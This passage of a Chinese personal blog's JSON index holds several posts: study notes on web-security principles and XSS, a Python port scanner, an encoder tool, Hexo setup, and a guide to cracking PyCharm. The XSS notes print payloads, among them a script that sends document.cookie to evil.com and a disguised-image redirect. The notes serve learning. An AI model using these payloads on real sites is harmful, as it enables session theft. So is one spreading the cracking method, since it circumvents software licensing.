上传了一张图片，地址为：http://.../uploads/xxx.jpg 2. 而图片内容是： png(正常的图片开头，绕过某些检测） &lt;script language=&quot;javascript:&quot;&gt; var c = window.location.tostring(); if(c.indexof(&quot;?&quot;) != -1 { var i = c.split(&quot;?&quot;)[1]; if(i.split(&quot;_&quot;)[0]==1) { location.href = &apos;http://evil.com/xxx.asp?id=&apos; + i.split(&quot;_&quot;)[1]; else { location.href = &apos;http://evil.com/xxx.asp?id=&apos; + i.split(&quot;_&quot;)[1]; } } &lt;/script&gt;","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"读《白帽子讲web安全》的收获(二)","slug":"读《白帽子讲web安全》的收获-二","permalink":"https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E4%BA%8C/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"GG转码器","slug":"GG转码器","date":"2020-01-31T12:06:45.000Z","updated":"2020-03-06T12:43:07.880Z","comments":true,"path":"2020/01/31/GG转码器/","link":"","permalink":"https://ggyggy666.github.io/2020/01/31/GG%E8%BD%AC%E7%A0%81%E5%99%A8/","excerpt":"今天学习了如何使用python编写一款转码器。","text":"今天学习了如何使用python编写一款转码器。 虽然转码可以使用在线网站或者burp的转码功能，但我更喜欢直接点开一个软件使用，何况还是自己敲出来的。虽然看起来是比较简陋了点。。。 使用效果输入要编码的字符，再点击“转码” 可以看到在对应的输入框中都输出了编码后相应的字符。也可以点击每一个输入框后面的“解码”按钮进行解码，如：当然也可以在每一个输入框中输入想要编码的字符串然后点击“编码”按钮：我把它放到了我的GitHub上，有兴趣的可以去看看。","categories":[{"name":"python工具","slug":"python工具","permalink":"https://ggyggy666.github.io/categories/python%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"GG转码器","slug":"GG转码器","permalink":"https://ggyggy666.github.io/tags/GG%E8%BD%AC%E7%A0%81%E5%99%A8/"}],"keywords":[{"name":"python工具","slug":"python工具","permalink":"https://ggyggy666.github.io/categories/python%E5%B7%A5%E5%85%B7/"}]},{"title":"读《白帽子讲web安全》的收获(一)","slug":"读《白帽子讲web安全》的收获(一)","date":"2020-01-30T13:37:30.000Z","updated":"2020-03-01T03:16:00.148Z","comments":true,"path":"2020/01/30/读《白帽子讲web安全》的收获(一)/","link":"","permalink":"https://ggyggy666.github.io/2020/01/30/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%B8%80)/","excerpt":"从放假就开始看的《白帽子讲web安全》终于（粗略地）看完了，在此简单总结一下收获。","text":"从放假就开始看的《白帽子讲web安全》终于（粗略地）看完了，在此简单总结一下收获。 本篇为收获（一）。 安全问题就是信任问题 设计安全方案的技巧 - Secure By Default原则 1. 黑名单、白名单 2. 最小权限原则 - 纵深防御原则（不同层面都要考虑周全） - 数据与代码分离原则 - 不可预测性原则 同源策略 a.com加载了b.com的js,这个js就是运行在a.com中的了，所以其Origin就应该是a.com。可通过检测HTTP头，采用CSP。（返回头中含 X-Content-Security-Policy:…) xss 实质：将用户的输入当成代码执行了。 - 窃取cookie 1. 先加载一个脚本http://www.aaa.com/test.html?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt; 2. 在远程脚本（evil.com中的evil.js)输入： var img = document.getElement(&quot;img&quot;) img.src = &quot;http://www.evil.com/log?&quot;+escape(document.cookie); document.body.appendChild(img); 通过向页面插入了一张看不见的图片，盗取cookie（有httponly就不行了） - 构造GET和POST请求 上面的第2点中的代码就是一个GET请求。 POST请求可以使用form表单，或者直接写HTML代码，或者通过XmlHttpRequeste发送（使用ajax） - 根据浏览器特有标识识别浏览器、还可识别用户安装的软件 - 通过CSS，访问过某个网站，颜色会不同 - xss构造技巧 1. 字符编码 输入被&quot;&quot;包着，对双引号进行\\转义，可以用%c1&quot;,因为%c1与\\组成新字符，把\\吃掉 2. 绕过长度限制 - 利用location.hash 可以输入&quot; onclick=&quot;eval(location.hash.substr(1))&quot;/ ,然后再URL中后面输入#alert(1) - 利用注释符 对于可控的多行输入，在第一行输入：&quot;&gt;&lt;!-- ,在后面一行输入：--&gt;&lt;script&gt;alert(1)&lt;/script&gt; - 利用window.name 在a.com中对window.name赋值，然后导向b.com中，那么b.com中的window.name是同一个。 &lt;script&gt; window.name = &quot;alert(document.cookie)&quot;; location.href = &quot;http://www.xsstest/xss.php&quot;; &lt;/script&gt; 再在定向到的www.xsstest/xss.php中写入：eval(name); - xss回旋镖 B上存在反射型xss,A上存在存储型xss,可以在A上的xss中嵌入B的xss。 在A上写一个form表单，自动提交到B，B中再跳转回A。 3.Dom型xss重点关注 1. 所有inputs框 2. window.location(href,hash等) 3. window.name 4. document.referer 5. document.cookie 6. localstorage 7. XMLHttpRequest返回的数据-","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"读《白帽子讲web安全》的收获(一)","slug":"读《白帽子讲web安全》的收获-一","permalink":"https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E4%B8%80/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"端口扫描工具的编写","slug":"使用python编写端口扫描工具","date":"2020-01-22T13:39:46.312Z","updated":"2020-03-06T12:42:53.814Z","comments":true,"path":"2020/01/22/使用python编写端口扫描工具/","link":"","permalink":"https://ggyggy666.github.io/2020/01/22/%E4%BD%BF%E7%94%A8python%E7%BC%96%E5%86%99%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/","excerpt":"新的一年就要到来了，我的博客也该更新了。","text":"新的一年就要到来了，我的博客也该更新了。 今天又是一个大好的日子。我学会了如何使用python编写一个简单的端口扫描工具，收获颇多，特来分享。所谓“万事开头难”，因此在开始进行编写之前，我们首先得理清一下编写这样一个工具需要的流程是什么。 根据工具名便可以判断出，我们需要使用一些python自带的库来进行端口的扫描。 一个机器的端口有很多，我们需要循环去判断它是否开放。如果一个一个的去扫，势必要花费很多时间，因此需要使用多线程来达到减少运行时间的目的。 理清了这样一条思路，我们便可以一步步地去实现它。 利用socket库实现TCP端口扫描 要想利用socket库，首先得了解一下它的用法。菜鸟教程里有它的完整使用方法，可自行了解。讲一下我们将要用到的socket函数。首先是： socket.socket([family[, type[, proto]]]) socket又称“套接字”，从上面便可以看出。但其实上面那行代码并不好理解，因此可以换成另一种形式： socket(int domain, int type, int protocol) 看看它们各自都代表了什么： domain：协议域，又称协议族（family），可以是AF_UNIX或AF_INET（使用32位的ipv4地址和16位的端口号组合）或AF_INET6等。 type：知道socket类型。常用的有面向连接的SOCK_STREAM和面向非连接的SOCK_DGRAM。 protocol，一般不填默认为0。 具体信息可以看这篇文章,我们要用到面向连接的ipv4地址进行扫描，因此socket函数就可以是： client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 将这个函数对象赋给client（客户端），然后使用这个对象进行连接： client.connect((target, port)) 注意connect中的数据类型是元组类型。target即为ipv4地址，port为要扫描的端口。这便是进行了一次扫描，然后将结果打印出来，最后需要用close()关闭。（可以将它想象成对一个文件的操作）封装成一个portscan函数：这里还使用了try-except，以防程序产生异常后就退出。 使用多线程运行扫描函数 要使用到多线程，就需要用到python库中的Thread库。它的具体用法可以查看苍松的博客。我们这里用到只是它的最简单的用法。 Thread(group=None, target=None, name=None, args=(), kwargs={}) 上面的是完整的函数参数，只关注我们需要的即可。这里的target不是上文中提到的需要扫描的ipv4地址，而是要执行的方法（函数），可以填入我们的portscan。然后后面的args参数值就填传入的参数，即ipv4地址和端口。 t = Thread(target=portscan, args=(target, port)) 注意target的参数值只需要填函数名，不用()，args的参数值一样需要是元组类型。然后使用： t.start() 来启动线程。由于我们需要遍历端口观察它是否开放，因此可以将启动多线程这步放到一个遍历端口的循环中。这里只遍历到1024端口。为了方便扫描，ipv4地址需要自己输入，然后传入main函数中。还可以使用time库计算处运行所需的时间。不要忘了导入所需要用到的库哦。 最终效果如下：端口扫描工具就这样做好啦！虽然看起来简单，代码很少，但是还是需要动手去实现才能体会到其中艰难，才会更有效果。对了，忘记提一句。这里的ipv4地址是我本机的地址，可以通过： win+R -&gt; 输入cmd -&gt; 输入ipconfig -&gt;查看‘无线局域网适配器 WLAN:’的IPv4地址 得到。当然，扫描域名也是可以的。打包后的代码放到了我的github上。今天就到这里了，期待下一次能学到更多有趣的东西。 扫描下方的二维码，更多精彩文章等你来看哦。","categories":[{"name":"python工具","slug":"python工具","permalink":"https://ggyggy666.github.io/categories/python%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"使用pycharm编写简单的端口扫描工具","slug":"使用pycharm编写简单的端口扫描工具","permalink":"https://ggyggy666.github.io/tags/%E4%BD%BF%E7%94%A8pycharm%E7%BC%96%E5%86%99%E7%AE%80%E5%8D%95%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"}],"keywords":[{"name":"python工具","slug":"python工具","permalink":"https://ggyggy666.github.io/categories/python%E5%B7%A5%E5%85%B7/"}]},{"title":"永久破解pycharm2019-2.3的方法","slug":"永久破解pycharm2019-2.3的方法","date":"2020-01-15T16:11:09.000Z","updated":"2020-03-01T02:51:57.558Z","comments":true,"path":"2020/01/16/永久破解pycharm2019-2.3的方法/","link":"","permalink":"https://ggyggy666.github.io/2020/01/16/%E6%B0%B8%E4%B9%85%E7%A0%B4%E8%A7%A3pycharm2019-2.3%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"朋友们，该学习python了。","text":"朋友们，该学习python了。 本人由于想要使用pycharm来学习python，但又苦于没有钱买正版，于是找了几个小时的破解教程。但是网上的教程大多数都是挺久以前的了，使用的激活码等已经不能用了。就在我几欲放弃之时，终于被我找到了真实有效的破解教程啦！ 直接给出原文链接吧，我就不在此赘述了。樱花庄的小樱需要注意的是：最后一步激活时原文是直接等待它自动弹出链接地址，但是我没有等到它弹出来就自己先把那个地址填上去了，注意那个地址现在已经变了，应修改为：http://fls.jetbrains-agent.com。再点击激活就OK了。如果出现无法链接的情况，可先尝试关掉再重启pycharm，再按以上步骤重试一遍即可。 来看看我最终成功的图片：哈哈，从此我就走上py之路啦！","categories":[{"name":"python工具","slug":"python工具","permalink":"https://ggyggy666.github.io/categories/python%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"永久破解pycharm2019-2.3的方法","slug":"永久破解pycharm2019-2-3的方法","permalink":"https://ggyggy666.github.io/tags/%E6%B0%B8%E4%B9%85%E7%A0%B4%E8%A7%A3pycharm2019-2-3%E7%9A%84%E6%96%B9%E6%B3%95/"}],"keywords":[{"name":"python工具","slug":"python工具","permalink":"https://ggyggy666.github.io/categories/python%E5%B7%A5%E5%85%B7/"}]},{"title":"个人博客简述","slug":"个人博客简述","date":"2020-01-03T05:26:50.000Z","updated":"2020-01-25T01:16:42.833Z","comments":true,"path":"2020/01/03/个人博客简述/","link":"","permalink":"https://ggyggy666.github.io/2020/01/03/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%AE%80%E8%BF%B0/","excerpt":"这是我的第一个博客从今天开始就正式上线啦！","text":"这是我的第一个博客从今天开始就正式上线啦！ 至于为什么会突然想写一些东西，谁知道呢，嘻嘻。好吧，其实是因为在期末写了几篇结课论文后，感觉将从网上所学会的东西用文字记录下来能理解的更深、更透彻，而且由于太久没写文章，感觉自己的写作水平急剧下降，于是产生了写博客的想法。不过搭建博客的路程真是艰辛呐，从前天开始就一直在百度、CSDN、谷歌、必应上畅游。找教程、找问答、然后动手实践。但其实大多数时间都花在了解决遇到的各种问题上，害，真的一言难尽啊。所幸在我的坚持不懈下，终于初步建成了它。包括你现在看到的这篇简述，也是在学会了一点markdown语法后写出的。写得很不成熟，但请不要介意。在未来，可能会偶尔更新一下它，将自己所学的东西记录下来，也算是一个成长过程的见证吧。【暂定内容主要包括python、web安全吧(目前学习方向)】欢迎关注我！ 扫描下方的二维码，精彩文章等你来看哦。","categories":[{"name":"home","slug":"home","permalink":"https://ggyggy666.github.io/categories/home/"}],"tags":[{"name":"简述 2020年","slug":"简述-2020年","permalink":"https://ggyggy666.github.io/tags/%E7%AE%80%E8%BF%B0-2020%E5%B9%B4/"}],"keywords":[{"name":"home","slug":"home","permalink":"https://ggyggy666.github.io/categories/home/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-01-03T03:06:05.756Z","updated":"2020-01-21T12:55:12.971Z","comments":true,"path":"2020/01/03/hello-world/","link":"","permalink":"https://ggyggy666.github.io/2020/01/03/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[{"name":"home","slug":"home","permalink":"https://ggyggy666.github.io/categories/home/"}],"tags":[{"name":"博客的使用方法","slug":"博客的使用方法","permalink":"https://ggyggy666.github.io/tags/%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"}],"keywords":[{"name":"home","slug":"home","permalink":"https://ggyggy666.github.io/categories/home/"}]}]}